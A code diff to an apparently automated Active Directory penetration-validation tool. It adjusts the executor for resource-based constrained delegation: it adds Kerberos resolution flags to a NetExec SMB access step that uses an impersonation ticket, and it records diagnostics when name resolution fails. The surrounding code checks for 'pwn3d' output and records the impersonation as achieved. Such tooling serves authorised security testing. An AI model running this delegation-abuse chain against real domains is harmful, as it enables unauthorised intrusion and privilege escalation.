@@ -20,6 +20,7 @@ new-computer password is generated per run and never leaves this process; only a
 non-secret success predicate is recorded.
 """
 from __future__ import annotations
+from .. import netresolve
 
 import re
 import secrets
@@ -250,13 +251,19 @@ class RBCDExecutor(ValidationExecutor):
         terminal_fact: Optional[dict] = None
         nxc_ok = False
         if getst_ok:
-            nxc_argv = ["nxc", "smb", victim, "-k", "--use-kcache"]
+            nxc_argv = ["nxc", "smb", victim, "-k", "--use-kcache",
+                        *netresolve.nxc_kerberos_flags(self.cfg)]
             res = ctx.runner.run(nxc_argv, timeout=ctx.config.tool_timeout_s,
                                  env={"KRB5CCNAME": ticket}, cwd=str(out_dir))
             out = res.stdout or ""
             nxc_ok = bool(_RE_NXC_PWNED.search(out) or _RE_NXC_AUTH_OK.search(out))
             record("nxc_access", nxc_argv, res, nxc_ok,
                    note="pwn3d" if _RE_NXC_PWNED.search(out) else "auth" if nxc_ok else "")
+            if not nxc_ok:
+                diag = netresolve.classify_resolution_failure(
+                    self.cfg, victim, out + "\n" + (res.stderr or ""))
+                if diag:
+                    errors.append(diag)
             terminal_fact = proof.build_terminal_fact(
                 self.terminal_kind, ok=nxc_ok, impersonated=impersonate,
                 predicate=(f"impersonated {impersonate} to {spn} via RBCD on "
